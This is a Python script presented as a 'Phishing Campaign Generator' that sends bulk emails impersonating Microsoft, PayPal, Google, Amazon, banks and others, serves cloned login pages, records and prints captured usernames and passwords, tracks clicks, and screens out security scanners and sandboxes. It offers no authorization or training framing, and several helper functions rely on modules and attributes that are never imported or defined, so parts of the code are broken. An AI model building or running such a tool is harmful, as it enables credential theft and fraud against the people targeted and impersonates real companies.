#!/usr/bin/env python3
import os
import subprocess
import time
import smtplib
import socket
import threading
import json
import random
import string
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class PhishingCampaign:
    def __init__(self):
        self.campaigns = []
        self.caught_creds = []
        self.click_tracking = []
        self.server = None
        self.smtp_config = {}
        
        self.templates = {
            'office365': {
                'subject': 'Urgent: Your Microsoft Office 365 account requires verification',
                'body': '''Dear User,\n\nWe have detected unusual activity on your Microsoft Office 365 account.\nFor your security, please verify your account immediately.\n\nClick here to verify: {link}\n\nThis link will expire in 24 hours.\n\nBest regards,\nMicrosoft Security Team''',
                'sender': 'security@microsoft-support.com'
            },
            'paypal': {
                'subject': 'Important: Unusual Activity Detected on Your PayPal Account',
                'body': '''Hello,\n\nWe noticed suspicious activity on your PayPal account.\nTo protect your funds, we have temporarily limited your account.\n\nRestore access here: {link}\n\nIf you don\'t take action within 48 hours, your account will be permanently suspended.\n\nPayPal Security Department''',
                'sender': 'service@paypal-secure.com'
            },
            'banking': {
                'subject': 'Security Alert: Verify Your Bank Account',
                'body': '''Dear Valued Customer,\n\nDue to recent security upgrades, all customers must re-verify their accounts.\n\nComplete verification: {link}\n\nFailure to verify within 72 hours will result in account suspension.\n\nThank you,\nBank Security Division''',
                'sender': 'alerts@secure-banking.com'
            },
            'amazon': {
                'subject': 'Your Amazon Order Requires Payment Verification',
                'body': '''Hello,\n\nYour recent order could not be processed due to payment verification issues.\n\nOrder #: {order}\nAmount: ${amount}\n\nUpdate payment method: {link}\n\nYour order will be cancelled if not updated within 24 hours.\n\nAmazon Customer Service''',
                'sender': 'no-reply@amazon-orders.com'
            },
            'google': {
                'subject': 'Google Security Alert: New sign-in detected',
                'body': '''Hi,\n\nWe detected a new sign-in to your Google Account from an unrecognized device.\n\nLocation: {location}\nDevice: {device}\n\nIf this wasn\'t you, secure your account: {link}\n\nGoogle Security''',
                'sender': 'no-reply@google-security.com'
            },
            'linkedin': {
                'subject': 'You appeared in 12 searches this week',
                'body': '''Hi {name},\n\nYour profile has been viewed 47 times this week.\n12 recruiters from top companies searched for profiles like yours.\n\nSee who viewed your profile: {link}\n\nLinkedIn Premium Trial Available - Click to activate\n\nThe LinkedIn Team''',
                'sender': 'notifications@linkedin-mail.com'
            },
            'dropbox': {
                'subject': 'Shared file: Q4_Financial_Report.xlsx',
                'body': '''Hi,\n\n{sender_name} shared a file with you on Dropbox:\n\nFile: Q4_Financial_Report.xlsx\nSize: 2.4 MB\n\nView file: {link}\n\nThis link expires in 7 days.\n\nDropbox''',
                'sender': 'no-reply@dropbox-share.com'
            },
            'docusign': {
                'subject': 'Please DocuSign: Contract Agreement',
                'body': '''You have a document waiting for your signature.\n\nDocument: Employment_Contract_2025.pdf\nFrom: HR Department\nDeadline: {deadline}\n\nReview and sign: {link}\n\nDocuSign Electronic Signature Service''',
                'sender': 'dse@docusign-mail.com'
            }
        }
        
        self.landing_pages = {}
        self.webhook_data = []
        
    def generate_unique_id(self):
        timestamp = str(time.time())
        random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        return hashlib.sha256(f"{timestamp}{random_data}".encode()).hexdigest()[:16]
    
    def generate_hmac_token(self, user_id, secret='phishing_secret'):
        message = f"{user_id}:{int(time.time())}"
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()
        return f"{message}:{signature}"
    
    def verify_hmac_token(self, token, secret='phishing_secret'):
        try:
            parts = token.split(':')
            if len(parts) != 3:
                return False
            user_id, timestamp, signature = parts
            message = f"{user_id}:{timestamp}"
            expected_sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()
            return hmac.compare_digest(signature, expected_sig)
        except:
            return False
    
    def browser_fingerprint(self, user_agent, accept_lang, accept_encoding, headers):
        fp_data = f"{user_agent}{accept_lang}{accept_encoding}"
        for key in ['DNT', 'Connection', 'Upgrade-Insecure-Requests']:
            fp_data += str(headers.get(key, ''))
        return hashlib.md5(fp_data.encode()).hexdigest()
    
    def advanced_tracking(self, tracking_id, request_info):
        if tracking_id not in self.session_data:
            self.session_data[tracking_id] = {
                'visits': [],
                'clicks': [],
                'form_interactions': [],
                'mouse_movements': [],
                'scroll_depth': [],
                'time_on_page': []
            }
        
        visit_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': request_info.get('ip'),
            'user_agent': request_info.get('user_agent'),
            'referer': request_info.get('referer'),
            'fingerprint': self.browser_fingerprint(
                request_info.get('user_agent', ''),
                request_info.get('accept_lang', ''),
                request_info.get('accept_encoding', ''),
                request_info.get('headers', {})
            )
        }
        
        self.session_data[tracking_id]['visits'].append(visit_data)
        return visit_data
    
    def generate_polymorphic_page(self, template_type, tracking_id):
        base_html = self.templates[template_type]['html']
        
        random_elements = [
            f'<div style="display:none" id="t{random.randint(1000,9999)}"></div>',
            f'<!-- {random.randint(100000,999999)} -->',
            f'<meta name="generator" content="v{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,99)}">'
        ]
        
        mutated_html = base_html.replace('</head>', f"{''.join(random_elements)}</head>")
        
        tracking_script = f'''
        <script>
        var tid='{tracking_id}';
        var startTime=Date.now();
        var interactions={{}};
        
        document.addEventListener('mousemove',function(e){{
            if(!interactions.mouse)interactions.mouse=[];
            interactions.mouse.push({{x:e.clientX,y:e.clientY,t:Date.now()-startTime}});
        }});
        
        document.addEventListener('scroll',function(){{
            interactions.scroll=window.pageYOffset;
        }});
        
        document.querySelectorAll('input').forEach(function(input){{
            input.addEventListener('focus',function(){{
                if(!interactions.fields)interactions.fields=[];
                interactions.fields.push({{name:input.name,time:Date.now()-startTime}});
            }});
        }});
        
        window.addEventListener('beforeunload',function(){{
            navigator.sendBeacon('/track',JSON.stringify({{tid:tid,data:interactions,duration:Date.now()-startTime}}));
        }});
        </script>
        '''
        
        return mutated_html.replace('</body>', f"{tracking_script}</body>")
    
    def detect_sandbox(self, headers, ip):
        sandbox_indicators = {
            'user_agent_patterns': ['headless', 'phantom', 'selenium', 'bot', 'crawler', 'spider'],
            'suspicious_headers': ['X-Scanner', 'X-Security-Tool'],
            'known_ranges': ['10.0.', '192.168.', '172.16.']
        }
        
        score = 0
        ua = headers.get('User-Agent', '').lower()
        
        for pattern in sandbox_indicators['user_agent_patterns']:
            if pattern in ua:
                score += 30
        
        for header in sandbox_indicators['suspicious_headers']:
            if header in headers:
                score += 40
        
        for ip_range in sandbox_indicators['known_ranges']:
            if ip.startswith(ip_range):
                score += 20
        
        if not headers.get('Accept-Language'):
            score += 15
        
        if score > 50:
            return True, score
        return False, score
    
    def rate_limit_check(self, ip):
        current_time = time.time()
        if ip not in self.tracking_data:
            self.tracking_data[ip] = {'requests': [], 'blocked': False}
        
        recent_requests = [t for t in self.tracking_data[ip]['requests'] if current_time - t < 60]
        self.tracking_data[ip]['requests'] = recent_requests
        
        if len(recent_requests) > 10:
            self.tracking_data[ip]['blocked'] = True
            return False
        
        self.tracking_data[ip]['requests'].append(current_time)
        return True
    
    def encode_tracking_pixel(self, tracking_id):
        pixel_data = base64.b64encode(bytes([
            0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
            0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
            0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00,
            0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
            0x01, 0x00, 0x3B
        ])).decode()
        
        return f'<img src="data:image/gif;base64,{pixel_data}" style="display:none" id="{tracking_id}">'
    
    def create_tracking_link(self, base_url, campaign_id, target_email):
        tracking_id = self.generate_unique_id()
        link = f"{base_url}/t/{tracking_id}"
        
        self.click_tracking.append({
            'tracking_id': tracking_id,
            'campaign_id': campaign_id,
            'target_email': target_email,
            'clicked': False,
            'timestamp': None,
            'ip': None,
            'user_agent': None
        })
        
        return link
    
    def create_landing_page(self, template_type):
        if template_type == 'office365':
            return '''<!DOCTYPE html>
<html>
<head><title>Microsoft Account | Sign In</title>
<style>
body{font-family:Segoe UI,Arial;background:#f3f2f1;margin:0;padding:0}
.container{max-width:440px;margin:100px auto;background:white;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.logo{text-align:center;margin-bottom:32px}
h1{font-size:24px;font-weight:600;margin:0 0 8px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;box-sizing:border-box}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;cursor:pointer;font-size:15px}
button:hover{background:#106ebe}
</style></head>
<body>
<div class="container">
<div class="logo"><svg width="108" height="24"><path fill="#f25022" d="M0 0h24v24H0z"/><path fill="#7fba00" d="M26 0h24v24H26z"/><path fill="#00a4ef" d="M0 26h24v24H0z"/><path fill="#ffb900" d="M26 26h24v24H26z"/></svg></div>
<h1>Sign in</h1>
<p>to continue to Office 365</p>
<form method="POST" action="/capture">
<input type="email" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
</div></body></html>'''
        
        elif template_type == 'paypal':
            return '''<!DOCTYPE html>
<html>
<head><title>PayPal - Log In</title>
<style>
body{font-family:Helvetica Neue,Arial;background:#f5f7fa;margin:0;padding:0}
.container{max-width:400px;margin:80px auto;background:white;padding:40px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
.logo{text-align:center;margin-bottom:30px;color:#0070ba;font-size:32px;font-weight:bold}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #cbd2d9;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:14px;background:#0070ba;color:white;border:none;border-radius:20px;cursor:pointer;font-size:16px;margin-top:10px}
button:hover{background:#005ea6}
</style></head>
<body>
<div class="container">
<div class="logo">PayPal</div>
<h2 style="margin:0 0 20px;font-size:20px">Log in to your account</h2>
<form method="POST" action="/capture">
<input type="email" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div></body></html>'''
        
        elif template_type == 'banking':
            return '''<!DOCTYPE html>
<html>
<head><title>Secure Banking Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#1e3c72,#2a5298);margin:0;padding:0;min-height:100vh}
.container{max-width:420px;margin:100px auto;background:white;padding:50px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,0.3)}
.lock{text-align:center;font-size:48px;color:#1e3c72;margin-bottom:20px}
h1{text-align:center;color:#1e3c72;margin:0 0 30px}
input{width:100%;padding:15px;margin:12px 0;border:2px solid #ddd;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:15px;background:#1e3c72;color:white;border:none;border-radius:6px;cursor:pointer;font-size:16px;font-weight:bold}
</style></head>
<body>
<div class="container">
<div class="lock">🔒</div>
<h1>Secure Login</h1>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or Account Number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In Securely</button>
</form>
</div></body></html>'''
        
        elif template_type == 'dropbox':
            return '''<!DOCTYPE html>
<html>
<head><title>Dropbox - Shared File</title>
<style>
body{font-family:Atlas Grotesk,Arial;background:#f7f9fa;margin:0;padding:0}
.container{max-width:500px;margin:80px auto;background:white;padding:40px;border-radius:4px;box-shadow:0 1px 3px rgba(0,0,0,0.12)}
.logo{text-align:center;margin-bottom:30px;font-size:36px;font-weight:bold;color:#0061ff}
.file{background:#f7f9fa;padding:20px;border-radius:4px;margin:20px 0;text-align:center}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #c9d1d9;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0061ff;color:white;border:none;border-radius:4px;cursor:pointer;font-size:15px}
</style></head>
<body>
<div class="container">
<div class="logo">Dropbox</div>
<div class="file">
<div style="font-size:48px">📄</div>
<h3>Q4_Financial_Report.xlsx</h3>
<p>2.4 MB • Expires in 7 days</p>
</div>
<p>Sign in to download this file:</p>
<form method="POST" action="/capture">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in and Download</button>
</form>
</div></body></html>'''
        
        return '''<!DOCTYPE html>
<html>
<head><title>Verification Required</title>
<style>
body{font-family:Arial;background:#f0f2f5;margin:0;padding:0}
.container{max-width:450px;margin:100px auto;background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
h2{color:#1c1e21;margin:0 0 20px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer;font-size:16px;font-weight:bold}
</style></head>
<body>
<div class="container">
<h2>Verification Required</h2>
<p>Please enter your credentials to continue:</p>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Email or Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Verify Account</button>
</form>
</div></body></html>'''
    
    def start_phishing_server(self, port=8080):
        campaign_handler = self
        
        class PhishingHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                if self.path.startswith('/t/'):
                    tracking_id = self.path.split('/')[2]
                    
                    for track in campaign_handler.click_tracking:
                        if track['tracking_id'] == tracking_id and not track['clicked']:
                            track['clicked'] = True
                            track['timestamp'] = datetime.now().isoformat()
                            track['ip'] = self.client_address[0]
                            track['user_agent'] = self.headers.get('User-Agent', 'Unknown')
                            
                            print(f"\033[93m[!] Click tracked: {track['target_email']}\033[0m")
                            print(f"\033[97m    IP: {track['ip']}\033[0m")
                            print(f"\033[97m    User-Agent: {track['user_agent'][:50]}\033[0m")
                    
                    self.send_response(302)
                    self.send_header('Location', f'http://localhost:{port}/login')
                    self.end_headers()
                
                elif self.path == '/login' or self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    page = campaign_handler.create_landing_page('office365')
                    self.wfile.write(page.encode())
                
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/capture':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    
                    creds = {}
                    for param in post_data.split('&'):
                        if '=' in param:
                            key, value = param.split('=', 1)
                            creds[key] = value.replace('%40', '@').replace('+', ' ')
                    
                    capture_data = {
                        'timestamp': datetime.now().isoformat(),
                        'ip': self.client_address[0],
                        'credentials': creds,
                        'user_agent': self.headers.get('User-Agent', 'Unknown'),
                        'referer': self.headers.get('Referer', 'Direct')
                    }
                    
                    campaign_handler.caught_creds.append(capture_data)
                    
                    print(f"\n\033[91m[!] CREDENTIALS CAPTURED!\033[0m")
                    print(f"\033[97m    IP: {capture_data['ip']}\033[0m")
                    for key, val in creds.items():
                        print(f"\033[97m    {key}: {val}\033[0m")
                    
                    self.send_response(302)
                    self.send_header('Location', 'https://www.microsoft.com')
                    self.end_headers()
                
                else:
                    self.send_response(404)
                    self.end_headers()
        
        self.server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        
        print(f"\033[92m[+] Phishing server started: http://localhost:{port}\033[0m")
        
        server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        server_thread.start()
    
    def send_phishing_email(self, smtp_server, smtp_port, smtp_user, smtp_pass, target_email, template_type, tracking_url):
        try:
            template = self.templates.get(template_type, self.templates['office365'])
            
            msg = MIMEMultipart('alternative')
            msg['From'] = template['sender']
            msg['To'] = target_email
            msg['Subject'] = template['subject']
            
            tracking_link = self.create_tracking_link(tracking_url, self.generate_unique_id(), target_email)
            
            body_vars = {
                'link': tracking_link,
                'order': ''.join(random.choices(string.digits, k=12)),
                'amount': random.randint(50, 500),
                'location': random.choice(['New York, USA', 'London, UK', 'Tokyo, Japan']),
                'device': random.choice(['iPhone 15', 'Samsung Galaxy S24', 'Windows PC']),
                'name': target_email.split('@')[0].title(),
                'sender_name': 'John Smith',
                'deadline': datetime.now().strftime('%B %d, %Y')
            }
            
            body_text = template['body'].format(**body_vars)
            
            msg.attach(MIMEText(body_text, 'plain'))
            
            context = ssl.create_default_context()
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls(context=context)
                server.login(smtp_user, smtp_pass)
                server.send_message(msg)
            
            print(f"\033[92m[+] Email sent: {target_email}\033[0m")
            return True
        
        except Exception as e:
            print(f"\033[91m[!] Failed to send to {target_email}: {e}\033[0m")
            return False
    
    def bulk_campaign(self, smtp_config, target_list, template_type, tracking_url):
        success = 0
        failed = 0
        
        for target in target_list:
            if self.send_phishing_email(
                smtp_config['server'],
                smtp_config['port'],
                smtp_config['user'],
                smtp_config['password'],
                target,
                template_type,
                tracking_url
            ):
                success += 1
            else:
                failed += 1
            
            time.sleep(random.uniform(2, 5))
        
        print(f"\n\033[92m[+] Campaign complete: {success} sent, {failed} failed\033[0m")
    
    def generate_report(self, filename='phishing_report.json'):
        report = {
            'campaign_summary': {
                'total_emails_sent': len(self.click_tracking),
                'clicks': len([t for t in self.click_tracking if t['clicked']]),
                'click_rate': len([t for t in self.click_tracking if t['clicked']]) / max(len(self.click_tracking), 1) * 100,
                'credentials_captured': len(self.caught_creds)
            },
            'click_tracking': self.click_tracking,
            'captured_credentials': self.caught_creds,
            'timestamp': datetime.now().isoformat()
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\033[92m[+] Report saved: {filename}\033[0m")

def run():
    print("\033[92m" + "="*70)
    print("     PHISHING CAMPAIGN GENERATOR")
    print("="*70 + "\033[0m\n")
    
    campaign = PhishingCampaign()
    
    print("\033[97mCampaign mode:\033[0m")
    print("  [1] Start phishing server only")
    print("  [2] Send single test email")
    print("  [3] Launch full campaign")
    print("  [4] View templates")
    print("  [5] Export report")
    
    mode = input("\n\033[95m[?] Select: \033[0m").strip()
    
    if mode == '1':
        port = input("\033[95m[?] Port (default 8080): \033[0m").strip()
        port = int(port) if port.isdigit() else 8080
        
        campaign.start_phishing_server(port)
        
        print(f"\n\033[93m[*] Server running...\033[0m")
        print(f"\033[97m[*] Access: http://localhost:{port}\033[0m")
        print(f"\033[97m[*] Press Ctrl+C to stop\033[0m\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\033[93m[*] Server stopped\033[0m")
    
    elif mode == '2':
        print(f"\n\033[97mSMTP Configuration:\033[0m")
        smtp_server = input("\033[95m[?] SMTP server: \033[0m").strip()
        smtp_port = int(input("\033[95m[?] SMTP port (587): \033[0m").strip() or "587")
        smtp_user = input("\033[95m[?] SMTP username: \033[0m").strip()
        smtp_pass = input("\033[95m[?] SMTP password: \033[0m").strip()
        
        target = input("\n\033[95m[?] Target email: \033[0m").strip()
        
        print(f"\n\033[97mTemplates:\033[0m")
        for i, template in enumerate(campaign.templates.keys(), 1):
            print(f"  [{i}] {template}")
        
        template_choice = input("\n\033[95m[?] Select template: \033[0m").strip()
        template_name = list(campaign.templates.keys())[int(template_choice)-1]
        
        tracking_url = input("\033[95m[?] Tracking URL (http://yourserver:8080): \033[0m").strip()
        
        campaign.send_phishing_email(smtp_server, smtp_port, smtp_user, smtp_pass, target, template_name, tracking_url)
    
    elif mode == '3':
        print(f"\n\033[97mSMTP Configuration:\033[0m")
        smtp_config = {
            'server': input("\033[95m[?] SMTP server: \033[0m").strip(),
            'port': int(input("\033[95m[?] SMTP port (587): \033[0m").strip() or "587"),
            'user': input("\033[95m[?] SMTP username: \033[0m").strip(),
            'password': input("\033[95m[?] SMTP password: \033[0m").strip()
        }
        
        targets_file = input("\n\033[95m[?] Target list file (one email per line): \033[0m").strip()
        
        try:
            with open(targets_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except:
            print(f"\033[91m[!] Could not read file\033[0m")
            return
        
        print(f"\n\033[97mTemplates:\033[0m")
        for i, template in enumerate(campaign.templates.keys(), 1):
            print(f"  [{i}] {template}")
        
        template_choice = input("\n\033[95m[?] Select template: \033[0m").strip()
        template_name = list(campaign.templates.keys())[int(template_choice)-1]
        
        tracking_url = input("\033[95m[?] Tracking URL: \033[0m").strip()
        
        port = input("\033[95m[?] Server port (8080): \033[0m").strip()
        port = int(port) if port.isdigit() else 8080
        
        campaign.start_phishing_server(port)
        
        print(f"\n\033[92m[*] Starting campaign with {len(targets)} targets...\033[0m\n")
        
        campaign.bulk_campaign(smtp_config, targets, template_name, tracking_url)
        
        print(f"\n\033[93m[*] Monitoring for clicks and credentials...\033[0m")
        print(f"\033[97m[*] Press Ctrl+C to stop\033[0m\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            campaign.generate_report()
    
    elif mode == '4':
        print(f"\n\033[97mAvailable Templates:\033[0m\n")
        for name, template in campaign.templates.items():
            print(f"\033[92m{name.upper()}\033[0m")
            print(f"\033[97mSubject: {template['subject']}\033[0m")
            print(f"\033[97mSender: {template['sender']}\033[0m")
            print(f"\033[90m{template['body'][:150]}...\033[0m\n")
    
    elif mode == '5':
        filename = input("\033[95m[?] Report filename (phishing_report.json): \033[0m").strip() or 'phishing_report.json'
        campaign.generate_report(filename)
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
